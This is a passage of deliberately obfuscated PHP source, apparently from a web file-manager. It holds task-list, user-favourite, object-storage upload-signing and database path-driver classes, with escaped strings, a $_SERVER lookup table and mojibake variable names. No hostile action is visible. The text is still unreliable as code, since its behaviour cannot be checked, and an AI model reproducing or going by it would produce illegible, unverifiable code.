"\x53\x79\163\x74\145\155\56\x74\141\163\x6b\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\164\171\160\145", "\145\x76\145\156\164", "\x74\x69\x6d\145", "\x64\x65\x73\x63", "\163\x79\x73\x74\x65\155", "\145\x6e\141\x62\x6c\x65", "\154\141\163\x74\122\x75\156", "\x73\157\x72\x74"); public function listData($Ëæ‚½Á = false, $æúë›· = "\x73\x6f\x72\164", $âã½¸€¯ = false) { return parent::listData($Ëæ‚½Á, $æúë›·, $âã½¸€¯); } public function add($êáäÎÓ£) { $¨¢Üßğ =& $_SERVER[Î·Ü›öğ]; $áş¢£€Ä = $this->findByName($êáäÎÓ£[$¨¢Üßğ[32]]); if ($áş¢£€Ä) { return !1; } $êáäÎÓ£[$¨¢Üßğ[1760]] = 0; $êáäÎÓ£[$¨¢Üßğ[2034]] = $this->getSort(); return parent::insert($êáäÎÓ£); } private function getSort() { $·âÅºƒû =& $_SERVER[Î·Ü›öğ]; $ş‚¾× ® = parent::listData(); $‹Ùü¥¸ş = array_to_keyvalue($ş‚¾× ®, $·âÅºƒû[12], $·âÅºƒû[2034]); return empty($‹Ùü¥¸ş) ? 0 : max($‹Ùü¥¸ş) + 1; } public function update($ùÄÈ«©å, $à¼£ç§Ò) { $¨§”’íº =& $_SERVER[Î·Ü›öğ]; $Øë·ó = $this->listData($ùÄÈ«©å); $ÂË®û…Á = $this->findByName($à¼£ç§Ò[$¨§”’íº[32]]); if (!$Øë·ó || $ÂË®û…Á && $ÂË®û…Á[$¨§”’íº[477]] != $Øë·ó[$¨§”’íº[477]]) { return !1; } return parent::update($ùÄÈ«©å, $à¼£ç§Ò); } public function remove($¼ÎşŒ˜, $¸ ŸÔÈ = false) { $‚ÊæöÄü =& $_SERVER[Î·Ü›öğ]; $Û»Şôœ¸ = $this->listData($¼ÎşŒ˜); if (!$Û»Şôœ¸) { return; } if (!$¸ ŸÔÈ && $Û»Şôœ¸[$‚ÊæöÄü[192]] == $‚ÊæöÄü[91]) { return !1; } return parent::remove($¼ÎşŒ˜); } public function enable($‡“³Œ¨Ä, $Ñ¬§Á™–) { return $this->update($‡“³Œ¨Ä, array($_SERVER[Î·Ü›öğ][2500] => $Ñ¬§Á™–)); } public function run($Œã½ÑÖ) { return $this->update($Œã½ÑÖ, array($_SERVER[Î·Ü›öğ][2512] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($¨Ú£õ±) { $ Ó¬“Ü§ =& $_SERVER[Î·Ü›öğ]; return array($ Ó¬“Ü§[2125] => array(USER_ID, $ Ó¬“Ü§[2513])); } protected function listData() { $á§”¡Î« =& $_SERVER[Î·Ü›öğ]; $…âÔûƒ = array($á§”¡Î«[1801] => USER_ID, $á§”¡Î«[570] => 0); $¿¥Ø²Ò = $á§”¡Î«[2514]; $éìµØˆ¤ = $this->field($¿¥Ø²Ò)->where($…âÔûƒ)->order($á§”¡Î«[2515])->select(); return $éìµØˆ¤ ? $éìµØˆ¤ : array(); } protected function resetCache() { } protected function listView() { $€ñßÄ² =& $_SERVER[Î·Ü›öğ]; $ñ·Ò¦Ğó = $this->listData(); $ã†¹›Ê = array_filter_by_field($ñ·Ò¦Ğó, $€ñßÄ²[33], $€ñßÄ²[501]); $š…ğ†«œ = array_to_keyvalue($ã†¹›Ê, $€ñßÄ²[12], $€ñßÄ²[87]); if (!$š…ğ†«œ) { return $ñ·Ò¦Ğó; } $îãş‰ñ = 2000; $ô±Êšİ¦ = array($€ñßÄ²[502] => array($€ñßÄ²[503], $š…ğ†«œ)); $Ú’ÉÒğŒ = Model($€ñßÄ²[922])->listSource($ô±Êšİ¦, $îãş‰ñ); $Ú’ÉÒğŒ = array_merge($Ú’ÉÒğŒ[$€ñßÄ²[86]], $Ú’ÉÒğŒ[$€ñßÄ²[85]]); $Ú’ÉÒğŒ = array_to_keyvalue($Ú’ÉÒğŒ, $€ñßÄ²[194]); foreach ($ñ·Ò¦Ğó as $óùå¯³È => $·Ï†óËĞ) { $„©Èò¤ª = $Ú’ÉÒğŒ[$·Ï†óËĞ[$€ñßÄ²[87]]]; $„©Èò¤ª = $„©Èò¤ª ? $„©Èò¤ª : array(); $ñ·Ò¦Ğó[$óùå¯³È] = array_merge($„©Èò¤ª, $·Ï†óËĞ); } return $ñ·Ò¦Ğó; } protected function addFav($¡Ô½½¾é, $…¥ğ©ÃÜ = '', $ğää…¨í = "\x73\157\x75\162\143\145") { $Ø®éøãÆ =& $_SERVER[Î·Ü›öğ]; $¤¢‹• ş = array($Ø®éøãÆ[1801] => USER_ID, $Ø®éøãÆ[570] => 0, $Ø®éøãÆ[507] => $ğää…¨í, $Ø®éøãÆ[506] => $¡Ô½½¾é); if ($this->where($¤¢‹• ş)->find()) { return !1; } $¤¢‹• ş = array($Ø®éøãÆ[1801] => USER_ID, $Ø®éøãÆ[570] => 0); $ÑÇè´ç¢ = $this->where($¤¢‹• ş)->max($Ø®éøãÆ[2034]); if (!$ÑÇè´ç¢) { $ÑÇè´ç¢ = 0; } if (!$…¥ğ©ÃÜ && $ğää…¨í == $Ø®éøãÆ[501]) { $ÛŠ±éÌ = Model($Ø®éøãÆ[1458])->where(array($Ø®éøãÆ[502] => $¡Ô½½¾é))->find(); if (!$ÛŠ±éÌ) { return !1; } $…¥ğ©ÃÜ = $ÛŠ±éÌ[$Ø®éøãÆ[32]]; } $…¥ğ©ÃÜ = $this->getAutoName($…¥ğ©ÃÜ); $—¡èÌĞ = array($Ø®éøãÆ[1801] => USER_ID, $Ø®éøãÆ[570] => 0, $Ø®éøãÆ[505] => $…¥ğ©ÃÜ, $Ø®éøãÆ[506] => $¡Ô½½¾é, $Ø®éøãÆ[507] => $ğää…¨í, $Ø®éøãÆ[2014] => $ÑÇè´ç¢ + 1); return $this->add($—¡èÌĞ); } protected function remove($¸ê°ÓÑÖ) { $ÕÃ¿Ó­‘ =& $_SERVER[Î·Ü›öğ]; $‚İ¤º…­ = array($ÕÃ¿Ó­‘[1801] => USER_ID, $ÕÃ¿Ó­‘[504] => $¸ê°ÓÑÖ); return $this->where($‚İ¤º…­)->delete(); } protected function removeByName($»‰™Åü) { $Î£È€ŞÒ =& $_SERVER[Î·Ü›öğ]; $›……û–ì = array($Î£È€ŞÒ[1801] => USER_ID, $Î£È€ŞÒ[505] => $»‰™Åü, $Î£È€ŞÒ[570] => 0); return $this->where($›……û–ì)->delete(); } protected function rename($ÙŒ¿š€¼, $´ù»ÆÅö) { $°¾Æ±ßı =& $_SERVER[Î·Ü›öğ]; if ($ÙŒ¿š€¼ == $´ù»ÆÅö) { return !1; } $ ÄÇ„ = $this->getAutoName($´ù»ÆÅö); if ($´ù»ÆÅö != $ ÄÇ„) { return !1; } $™È¥ÔÑö = array($°¾Æ±ßı[1801] => USER_ID, $°¾Æ±ßı[570] => 0, $°¾Æ±ßı[32] => $ÙŒ¿š€¼); return $this->where($™È¥ÔÑö)->save(array($°¾Æ±ßı[32] => $´ù»ÆÅö)); } protected function resetSort($Ğ’Ÿ»ğ¥) { $ÔŸÃ‚ÖÛ =& $_SERVER[Î·Ü›öğ]; $Ğ’Ÿ»ğ¥ = is_array($Ğ’Ÿ»ğ¥) ? $Ğ’Ÿ»ğ¥ : array(); $Š˜ÒİÄ = array($ÔŸÃ‚ÖÛ[1801] => USER_ID); for ($Áî°Ş¸Ø = 0; $Áî°Ş¸Ø < count($Ğ’Ÿ»ğ¥); $Áî°Ş¸Ø++) { $Š˜ÒİÄ[$ÔŸÃ‚ÖÛ[504]] = $Ğ’Ÿ»ğ¥[$Áî°Ş¸Ø]; $this->where($Š˜ÒİÄ)->save(array($ÔŸÃ‚ÖÛ[2014] => $Áî°Ş¸Ø + 1)); } return !0; } protected function moveTop($‹¡Ÿ°ƒ) { $áÜª¯«Ê =& $_SERVER[Î·Ü›öğ]; $”£™«éÖ = array($áÜª¯«Ê[1801] => USER_ID, $áÜª¯«Ê[570] => 0); $ÅÖÕŞĞÊ = $this->where($”£™«éÖ)->where(array($áÜª¯«Ê[32] => $‹¡Ÿ°ƒ))->find(); if (!$ÅÖÕŞĞÊ) { return; } $÷ÈÓÍ‘» = $this->field($áÜª¯«Ê[477])->where($”£™«éÖ)->order($áÜª¯«Ê[2515])->select(); $÷ÈÓÍ‘» = array_to_keyvalue($÷ÈÓÍ‘», $áÜª¯«Ê[12], $áÜª¯«Ê[477]); $»˜‘Éó = $÷ÈÓÍ‘»; $÷ÈÓÍ‘» = array_remove_value($÷ÈÓÍ‘», $ÅÖÕŞĞÊ[$áÜª¯«Ê[477]]); array_unshift($÷ÈÓÍ‘», $ÅÖÕŞĞÊ[$áÜª¯«Ê[477]]); return $this->resetSort($÷ÈÓÍ‘»); } protected function moveBottom($—ÀÇÇĞ²) { $Ü»†Ú® =& $_SERVER[Î·Ü›öğ]; $¾ÜÊ‰ùç = array($Ü»†Ú®[1801] => USER_ID, $Ü»†Ú®[570] => 0); $×’ˆÎ´ = $this->where($¾ÜÊ‰ùç)->max($Ü»†Ú®[2034]); $´ÆÌ‰ä‡ = array($Ü»†Ú®[2034] => $×’ˆÎ´ + 1); return $this->where($¾ÜÊ‰ùç)->where(array($Ü»†Ú®[32] => $—ÀÇÇĞ²))->save($´ÆÌ‰ä‡); } private function getAutoName($ëı¢®“) { $¿Ñø’¥Ü =& $_SERVER[Î·Ü›öğ]; $æ¿õ…ŒÖ = array($¿Ñø’¥Ü[1801] => USER_ID, $¿Ñø’¥Ü[570] => 0); $²©Ã¤‰ = $this->field($¿Ñø’¥Ü[32])->where($æ¿õ…ŒÖ)->select(); $²©Ã¤‰ = array_to_keyvalue($²©Ã¤‰, $¿Ñø’¥Ü[12], $¿Ñø’¥Ü[32]); if (!$²©Ã¤‰ || !in_array($ëı¢®“, $²©Ã¤‰)) { return $ëı¢®“; } for ($›ÖÆ†è = 0; $›ÖÆ†è < count($²©Ã¤‰); $›ÖÆ†è++) { if (!in_array($ëı¢®“ . "\x28{$›ÖÆ†è}\51", $²©Ã¤‰)) { return $ëı¢®“ . "\50{$›ÖÆ†è}\51"; } } return $ëı¢®“ . "\x28{$›ÖÆ†è}\x29"; } } goto E×£…œä½À; a°÷¢ªù‡: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Œâ§ÉíŸ) { parent::__construct($Œâ§ÉíŸ); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } public function uploadFormData($ö§´Õ§, $…Õæ² = 3600) { $‹ëÑõİ =& $_SERVER[Î·Ü›öğ]; $ºÀ÷ãÎç = $‹ëÑõİ[232]; $£Æ«Ğ  = $‹ëÑõİ[1449]; $áÁ››†û = $‹ëÑõİ[264]; $¬îñØ“ = gmdate($‹ëÑõİ[1450], time() + $…Õæ²); $ìäãÑÈ³ = (string) time() . $‹ëÑõİ[74] . (string) (time() + $…Õæ²); $­ƒç¨Ê³ = array($‹ëÑõİ[265] => $¬îñØ“, $‹ëÑõİ[268] => array(array($‹ëÑõİ[309] => $ºÀ÷ãÎç), array($‹ëÑõİ[269] => $this->bucket), array($‹ëÑõİ[270], $‹ëÑõİ[271], $‹ëÑõİ[12]), array($‹ëÑõİ[273] => $áÁ››†û), array($‹ëÑõİ[1451] => $£Æ«Ğ ), array($‹ëÑõİ[1452] => $this->accessKey), array($‹ëÑõİ[1453] => $ìäãÑÈ³))); $­ƒç¨Ê³ = json_encode($­ƒç¨Ê³); $ªªñ‹¦Ï = hash_hmac($‹ëÑõİ[1449], $ìäãÑÈ³, $this->secret); $¾¢²Ô»â = sha1($­ƒç¨Ê³); $ëˆ­İñç = hash_hmac($‹ëÑõİ[1449], $¾¢²Ô»â, $ªªñ‹¦Ï); $é£½§ = array($‹ëÑõİ[309] => $ºÀ÷ãÎç, $‹ëÑõİ[273] => $áÁ››†û, $‹ëÑõİ[280] => base64_encode($­ƒç¨Ê³), $‹ëÑõİ[1451] => $£Æ«Ğ , $‹ëÑõİ[1452] => $this->accessKey, $‹ëÑõİ[1454] => $ìäãÑÈ³, $‹ëÑõİ[1455] => $ëˆ­İñç, $‹ëÑõİ[209] => $this->getHost()); return $é£½§; } public function fileOutImage($æŸªÅÙÍ, $Êá§Ş¸Û = 250) { $Ï©Ç =& $_SERVER[Î·Ü›öğ]; if ($this->size($æŸªÅÙÍ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($æŸªÅÙÍ, $Êá§Ş¸Û); } $³È‡«‚á = $this->link($æŸªÅÙÍ); $³È‡«‚á .= $Ï©Ç[1456] . $Êá§Ş¸Û . $Ï©Ç[1457]; $this->fileOutLink($³È‡«‚á); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($“û¾£íµ) { $this->pathParse = $“û¾£íµ; $this->model = Model($_SERVER[Î·Ü›öğ][1458]); } public function getPath($ñšÛ¤‹) { return trim($ñšÛ¤‹, $_SERVER[Î·Ü›öğ][8]); } public function pathFather($ö½¬ü ) { $ÑòĞø¶” = $this->parse($ö½¬ü ); $ÑòĞø¶” = $this->infoSimple($ö½¬ü ); return $ÑòĞø¶” ? $ÑòĞø¶”[$_SERVER[Î·Ü›öğ][193]] : !1; } public function pathThis($¼é‚£çš) { $èşƒ©×¸ = $this->infoSimple($¼é‚£çš); return $èşƒ©×¸ ? $èşƒ©×¸[$_SERVER[Î·Ü›öğ][32]] : !1; } public function getPathOuter($€’è¿ı) { if (!$€’è¿ı) { return $€’è¿ı; } $óÑÓõ—Ñ = $this->parse($€’è¿ı); return KodIO::make($óÑÓõ—Ñ[$_SERVER[Î·Ü›öğ][477]]); } public function copyFolderFromIO($ºÀô•åë, $Íı×–ßÎ, $Ï¤ÙÉòŸ, $ôğÅÉ ¢, $ÁÎ„¶) { $æ¢™§˜ = $this->model->copyFolderFromIO($ºÀô•åë, $Íı×–ßÎ, $Ï¤ÙÉòŸ, $ôğÅÉ ¢, $ÁÎ„¶); return KodIO::make($æ¢™§˜); } public function isParentOf($à¤·ÛÊü, $ËÇ‰ŒÅˆ) { return $this->model->isParentOf($à¤·ÛÊü, $ËÇ‰ŒÅˆ); } public function mkfile($İ„²¢, $ãéÕôø¦ = '', $“Ó”ÌÚ” = REPEAT_RENAME) { $¾Áæº©˜ =& $_SERVER[Î·Ü›öğ]; $ÇÍ¶Üå¸ = $this->parse($İ„²¢); $İ„²¢ = $ÇÍ¶Üå¸[$¾Áæº©˜[477]]; for ($ùıËã† = 0; $ùıËã† < count($ÇÍ¶Üå¸[$¾Áæº©˜[1459]]); $ùıËã†++) { $¨µõÛÒ› = $ÇÍ¶Üå¸[$¾Áæº©˜[1459]][$ùıËã†]; if ($ùıËã† == count($ÇÍ¶Üå¸[$¾Áæº©˜[1459]]) - 1) { $İ„²¢ = $this->model->mkfile($İ„²¢, $¨µõÛÒ›, $ãéÕôø¦, $“Ó”ÌÚ”); break; } $İ„²¢ = $this->model->mkdir($İ„²¢, $¨µõÛÒ›, REPEAT_SKIP); } return $this->getPathOuter($İ„²¢); } public function mkdir($‰‚ŞÓ‚, $Œ©è×–Ç = REPEAT_SKIP) { $ü‚àè¡Ü =& $_SERVER[Î·Ü›öğ]; $¢Ëí°·¸ = $this->parse($‰‚ŞÓ‚); $‰‚ŞÓ‚ = $¢Ëí°·¸[$ü‚àè¡Ü[477]]; for ($ƒîåú¤ = 0; $ƒîåú¤ < count($¢Ëí°·¸[$ü‚àè¡Ü[1459]]); $ƒîåú¤++) { $ä„—æˆ = $¢Ëí°·¸[$ü‚àè¡Ü[1459]][$ƒîåú¤]; $‰‚ŞÓ‚ = $this->model->mkdir($‰‚ŞÓ‚, $ä„—æˆ, $Œ©è×–Ç); } return $this->getPathOuter($‰‚ŞÓ‚); } public function copyFile($ïùŒ ø, $…ŸÏ€ÈÖ, $­ÅÆÇğ› = REPEAT_REPLACE) { $´ø€…¸ƒ =& $_SERVER[Î·Ü›öğ]; $íù½‡å = $this->parse($…ŸÏ€ÈÖ); $…Å±„‹ = $this->model->copy($ïùŒ ø, $íù½‡å[$´ø€…¸ƒ[477]], $­ÅÆÇğ›, $íù½‡å[$´ø€…¸ƒ[87]]); return $…Å±„‹ ? $this->getPathOuter($…Å±„‹) : !1; } public function moveFile($¼•»§Ìñ, $Å¥€à¼, $Ô˜ü£®ƒ = REPEAT_REPLACE) { $‡Â„¾Æ÷ =& $_SERVER[Î·Ü›öğ]; $­ğ—ñß = $this->parse($Å¥€à¼); $×º”Öõ = $this->model->move($¼•»§Ìñ, $­ğ—ñß[$‡Â„¾Æ÷[477]], $Ô˜ü£®ƒ, $­ğ—ñß[$‡Â„¾Æ÷[87]]); return $×º”Öõ ? $this->getPathOuter($×º”Öõ) : !1; } public function copy($ğÑú¾Í, $Ÿ¥ù†­­, $Û÷ÅÄë¡ = REPEAT_REPLACE, $ÂşõÒÃ = false) { $£ãÉÇèü = $this->parse($Ÿ¥ù†­­); $Â­»ÀÛ = $this->model->copy($ğÑú¾Í, $£ãÉÇèü[$_SERVER[Î·Ü›öğ][477]], $Û÷ÅÄë¡, $ÂşõÒÃ); return $Â­»ÀÛ ? $this->getPathOuter($Â­»ÀÛ) : !1; } public function moveSameAllow() { } public function move($Œø§ıïî, $ìûˆå­©, $£—‚‘óÀ = REPEAT_REPLACE, $‘”àæÖ = false) { $–Ìû˜ª² = $this->parse($ìûˆå­©); $Ê¬±„ = $this->model->move($Œø§ıïî, $–Ìû˜ª²[$_SERVER[Î·Ü›öğ][477]], $£—‚‘óÀ, $‘”àæÖ); return $Ê¬±„ ? $this->getPathOuter($Ê¬±„) : !1; } public function remove($¥ûÉ»€Ò, $ğä¶ƒŞä = true) { return $this->model->remove($¥ûÉ»€Ò, $ğä¶ƒŞä); } public function rename($ÏÕÆ¦, $¥£ÇüÉÃ) { $ŒÁŞ¶ = $this->model->rename($ÏÕÆ¦, $¥£ÇüÉÃ); return $ŒÁŞ¶ ? $this->getPathOuter($ÏÕÆ¦) : $ŒÁŞ¶; } public function size($Íø°à…Ì) { $ ğ¡£Í¾ = $this->infoSimple($Íø°à…Ì); return $ ğ¡£Í¾ ? $ ğ¡£Í¾[$_SERVER[Î·Ü›öğ][79]] : 0; } public function infoSimple($Ë¨×†ìç) { return $this->model->sourceInfo($Ë¨×†ìç); } public function info($†Ÿ°’Õ™) { return $this->infoParse($†Ÿ°’Õ™); } public function infoAuth($åŒâè) { return $this->infoParse($åŒâè, !1, !0); } public function infoWithChildren($¹í ÷Ä£) { return $this->infoParse($¹í ÷Ä£, !0); } protected function infoParse($‘±˜­á, $éÍ×£¶° = false, $Ê¶èšÒÓ = false) { if (!$éÍ×£¶°) { return $this->model->pathInfo($‘±˜­á, $Ê¶èšÒÓ); } return $this->model->pathInfoMore($‘±˜­á); } public function infoFullSimple($öÉ‘È¨„) { $éÚˆ•¯Å =& $_SERVER[Î·Ü›öğ]; $ĞŠ—’‡‘ = explode($éÚˆ•¯Å[8], $öÉ‘È¨„); $şÌíí‡ = implode($éÚˆ•¯Å[8], array_splice($ĞŠ—’‡‘, 1)); return $this->model->pathInfoByPath($ĞŠ—’‡‘[0], $şÌíí‡); } public function infoFull($ĞÂğ“ÜŸ) { $úıô½ã = $this->infoFullSimple($ĞÂğ“ÜŸ); return is_array($úıô½ã) ? $this->model->pathInfo($úıô½ã[$_SERVER[Î·Ü›öğ][194]]) : !1; } public function hashSimple($îŞ¯Œë) { $¦šœ ›ß =& $_SERVER[Î·Ü›öğ]; $°Œ“¯ ã = $this->infoWithChildren($îŞ¯Œë); return $°Œ“¯ ã[$¦šœ ›ß[170]][$¦šœ ›ß[688]]; } public function hashMd5($çÜ£öº¢) { $×â¿¬‘ë =& $_SERVER[Î·Ü›öğ]; $éäœ»Ü° = $this->infoWithChildren($çÜ£öº¢); return $éäœ»Ü°[$×â¿¬‘ë[170]][$×â¿¬‘ë[560]]; } public function exist($¹üª™Ğİ) { $™¬¸»Ø­ =& $_SERVER[Î·Ü›öğ]; $²ª¤ÏµÙ = $this->parse($¹üª™Ğİ); if (!$²ª¤ÏµÙ[$™¬¸»Ø­[87]]) { return $this->isFile($¹üª™Ğİ) || $this->isFolder($¹üª™Ğİ); } $Õšü = array($™¬¸»Ø­[488] => $²ª¤ÏµÙ[$™¬¸»Ø­[477]], $™¬¸»Ø­[32] => $²ª¤ÏµÙ[$™¬¸»Ø­[87]]); $¯ªîØö = $this->model->where($Õšü)->find(); return $¯ªîØö ? !0 : !1; } public function isFile($îÎ‘Ä) { $è…Í—Ğ =& $_SERVER[Î·Ü›öğ]; $ˆÆ¾Ê¼î = $this->infoSimple($îÎ‘Ä); return $ˆÆ¾Ê¼î && $ˆÆ¾Ê¼î[$è…Í—Ğ[496]] == $è…Í—Ğ[231] ? !0 : !1; } public function isFolder($¡ÎÈú…«) { $Î‹Œ®óˆ =& $_SERVER[Î·Ü›öğ]; $ÕŠ¼ªŞÜ = $this->infoSimple($¡ÎÈú…«); return $ÕŠ¼ªŞÜ && $ÕŠ¼ªŞÜ[$Î‹Œ®óˆ[496]] == $Î‹Œ®óˆ[91] ? !0 : !1; } public function listPath($ÏĞŒÁ‡Æ, $¤Ìˆ„åø = false) { $Ùî¿—š‡ =& $_SERVER[Î·Ü›öğ]; if ($ÏĞŒÁ‡Æ == $Ùî¿—š‡[12]) { return !1; } $ù«º¬Õ  = array($Ùî¿—š‡[488] => $ÏĞŒÁ‡Æ); if ($¤Ìˆ„åø) { return $this->model->listSource($ù«º¬Õ , -1); } return $this->model->listSource($ù«º¬Õ ); } public function has($Ó­•®», $¿·¾ÑÂù = false, $ùêÒû = null) { $±û¥šĞ =& $_SERVER[Î·Ü›öğ]; $ğœÇ«ÑÓ = $this->infoWithChildren($Ó­•®»); if ($¿·¾ÑÂù) { return array($±û¥šĞ[243] => $ğœÇ«ÑÓ[$±û¥šĞ[243]], $±û¥šĞ[242] => $ğœÇ«ÑÓ[$±û¥šĞ[242]]); } return $ùêÒû ? $ğœÇ«ÑÓ[$±û¥šĞ[243]] : $ğœÇ«ÑÓ[$±û¥šĞ[242]]; } public function listAll($ÑºÁ”Œ) { $©˜’±Ç“ = IO::info($this->pathParse[$_SERVER[Î·Ü›öğ][87]]); if (!$©˜’±Ç“) { return array(); } return $this->model->listAll($ÑºÁ”Œ); } public function getContent($“ı¹’éô) { return $this->model->getContent($“ı¹’éô); } public function setContent($–ú§»®Ç, $©Ë­¿Âı = '') { return $this->model->setContent($–ú§»®Ç, $©Ë­¿Âı); } public function fileSubstr($ãìøŞä¡, $Á…ş°»Ú, $öøü×†) { return $this->model->fileSubstr($ãìøŞä¡, $Á…ş°»Ú, $öøü×†); } public function download($ªğñá¹¶, $ìÇœš½İ = '') { $™½”ÛèÜ = get_path_father($ìÇœš½İ); $’‘‘‘×— = get_path_this($ìÇœš½İ); $³¿Á¿üğ = $this->model->fileInfoGet($ªğñá¹¶); $’¾×ãûÙ = IO::copy($³¿Á¿üğ[$_SERVER[Î·Ü›öğ][87]], $™½”ÛèÜ, !1, $’‘‘‘×—); return $’¾×ãûÙ; } public function setModifyTime($¤ÚÊÙé, $†§¯×‰ı = '') { $Ë·´ØÁ =& $_SERVER[Î·Ü›öğ]; if (!$¤ÚÊÙé) { return; } $this->model->where(array($Ë·´ØÁ[502] => $¤ÚÊÙé))->save(array($Ë·´ØÁ[88] => $†§¯×‰ı)); } public function upload($Óğºİº, $Õœ¬¡œ¹, $îÏÒß£ = false, $Ş€Ş™¼ç = REPEAT_REPLACE) { $¨ø‡§Øô =& $_SERVER[Î·Ü›öğ]; $Ú“ûß¬ƒ = $this->parse($Óğºİº); $ïü©³° = $this->model->addFile($Ú“ûß¬ƒ[$¨ø‡§Øô[477]], $Õœ¬¡œ¹, $Ú“ûß¬ƒ[$¨ø‡§Øô[87]], $îÏÒß£, $Ş€Ş™¼ç); return $this->getPathOuter($ïü©³°); } public function uploadFileByID($›°øÅş­, $© ¡‡ÓÙ, $•¿³á) { $ëõš’ü =& $_SERVER[Î·Ü›öğ]; $¬ôÚŸ˜ = $this->parse($›°øÅş­); $Ï˜Óèß£ = $this->model->addFileByFileID($¬ôÚŸ˜[$ëõš’ü[477]], $© ¡‡ÓÙ, $¬ôÚŸ˜[$ëõš’ü[87]], $•¿³á); return $this->getPathOuter($Ï˜Óèß£); } public function addFileByRemote($Ô¤®ÏœÏ, $•²ˆŸÊ™, $§ºí›ø€ = array(), $ó  Ï´§ = '', $ìÊ‹®ª¼) { $®™¶Î»É =& $_SERVER[Î·Ü›öğ]; $õèĞÌÓ = $this->parse($Ô¤®ÏœÏ); $ó  Ï´§ = empty($ó  Ï´§) ? $õèĞÌÓ[$®™¶Î»É[87]] : $ó  Ï´§; $•Î­÷¾Ø = $this->model->addFileByRemote($õèĞÌÓ[$®™¶Î»É[477]], $•²ˆŸÊ™, $ó  Ï´§, $§ºí›ø€, $ìÊ‹®ª¼); return $this->getPathOuter($•Î­÷¾Ø); } public function uploadLink($’ûú˜¯¢, $ã£ºØ«Ü = 0) { $ÌÓï”Åç =& $_SERVER[Î·Ü›öğ]; $ö’î°ƒ  = $this->parse($’ûú˜¯¢); $¨Šë¹Ü = _get($GLOBALS[$ÌÓï”Åç[7]], $ÌÓï”Åç[1460]); $Â©‰Ÿ×ä = _get($GLOBALS[$ÌÓï”Åç[7]], $ÌÓï”Åç[1461]); $×Ò–¾ñ = KodIO::ioFileDriverGet($ÌÓï”Åç[494] . $ö’î°ƒ [$ÌÓï”Åç[477]] . $ÌÓï”Åç[404]); $¨»„À‹ƒ = Model($ÌÓï”Åç[690])->createFileName($ö’î°ƒ [$ÌÓï”Åç[87]], $×Ò–¾ñ, $¨Šë¹Ü, $Â©‰Ÿ×ä); return IO::uploadLink($¨»„À‹ƒ, $ã£ºØ«Ü); } public function fileNameAuto($áÌíé¼¯, $›¶Éë¾ø, $äÍøÔô€ = REPEAT_REPLACE, $ñµÔúÙ = false) { return $this->model->fileNameAuto($áÌíé¼¯, $›¶Éë¾ø, $äÍøÔô€, $ñµÔúÙ); } public function fileNameExist($ù¨úµ©¥, $ÉØìûñ½) { return $this->model->fileNameExist($ù¨úµ©¥, $ÉØìûñ½); } protected function _fileOut($ƒ²Äõßú, $ÀîÓóáş = false, $»†¤ŠÃå = false, $š““Ğâ = '', $ÙªÄ§ë = false) { $çİ¸‡Šù =& $_SERVER[Î·Ü›öğ]; $çÎ§ö»Ø = $this->model->sourceInfo($ƒ²Äõßú); if ($çÎ§ö»Ø[$çİ¸‡Šù[496]] == $çİ¸‡Šù[91]) { header($çİ¸‡Šù[1462]); die; } $€Ğ­¤ = $this->model->fileInfoGet($ƒ²Äõßú); $š““Ğâ = $€Ğ­¤[$çİ¸‡Šù[560]] ? $€Ğ­¤[$çİ¸‡Šù[560]] : $š““Ğâ; $¼¯ºÌÏ = isset($GLOBALS[$çİ¸‡Šù[183]]) && is_array($GLOBALS[$çİ¸‡Šù[183]]) ? $GLOBALS[$çİ¸‡Šù[183]][$çİ¸‡Šù[32]] : $çÎ§ö»Ø[$çİ¸‡Šù[32]]; if ($ÙªÄ§ë) { return IO::fileOutServer($€Ğ­¤[$çİ¸‡Šù[87]], $ÀîÓóáş, $¼¯ºÌÏ, $š““Ğâ); } IO::fileOut($€Ğ­¤[$çİ¸‡Šù[87]], $ÀîÓóáş, $¼¯ºÌÏ, $š““Ğâ); } public function fileOut($«Î›óœ, $–‡ªö§¾ = false, $¾ºï½ = false, $À·®Í˜ü = '') { $this->_fileOut($«Î›óœ, $–‡ªö§¾, $¾ºï½, $À·®Í˜ü); } public function fileOutServer($•‹¤âö, $ØÀİÅÛ¸ = false, $¼óŞ«¬‰ = false, $Ñ£†èœÄ = '') { $this->_fileOut($•‹¤âö, $ØÀİÅÛ¸, $¼óŞ«¬‰, $Ñ£†èœÄ, !0); } protected function _fileOutImage($ñùÎåÅÜ, $†º‰¼û« = 250) { $ığïªÇ =& $_SERVER[Î·Ü›öğ]; $ÑÄèÜ¤‚ = $this->model->pathInfo($ñùÎåÅÜ); if ($ÑÄèÜ¤‚[$ığïªÇ[496]] == $ığïªÇ[91]) { show_json($ığïªÇ[1463] . $ñùÎåÅÜ, !1); } $ˆ–ÎúÓõ = $this->model->fileInfoGet($ñùÎåÅÜ); $ÑÄèÜ¤‚[$ığïªÇ[184]] = $ˆ–ÎúÓõ[$ığïªÇ[87]]; $GLOBALS[$ığïªÇ[183]] = $ÑÄèÜ¤‚; IO::fileOutImage($ˆ–ÎúÓõ[$ığïªÇ[87]], $†º‰¼û«); } public function fileOutImage($Ë¢™‚Ûª, $âÆèÇ¡µ = 250) { $this->_fileOutImage($Ë¢™‚Ûª, $âÆèÇ¡µ); } public function fileOutImageServer($À¦…Ÿ», $»ú®ÉıÓ = 250) { $this->_fileOutImage($À¦…Ÿ», $»ú®ÉıÓ); } public function link($ñª‡Âòğ, $°†©„î = '') { $Ä¸£Ş’ƒ = $this->model->fileInfoGet($ñª‡Âòğ); return IO::link($Ä¸£Ş’ƒ[$_SERVER[Î·Ü›öğ][87]], $°†©„î); } protected function parse($„”± ¦½) { $Õü©Ã¼¬ =& $_SERVER[Î·Ü›öğ]; if (strstr($„”± ¦½, $Õü©Ã¼¬[8]) === !1) { return array($Õü©Ã¼¬[504] => intval($„”± ¦½), $Õü©Ã¼¬[87] => $Õü©Ã¼¬[12], $Õü©Ã¼¬[1459] => array()); } $ÁŸÔÃÜ = explode($Õü©Ã¼¬[8], trim($„”± ¦½, $Õü©Ã¼¬[8])); if (count($ÁŸÔÃÜ) < 2) { show_tips(clear_html($„”± ¦½) . $Õü©Ã¼¬[1464]); } return array($Õü©Ã¼¬[504] => intval($ÁŸÔÃÜ[0]), $Õü©Ã¼¬[87] => $ÁŸÔÃÜ[1], $Õü©Ã¼¬[1459] => 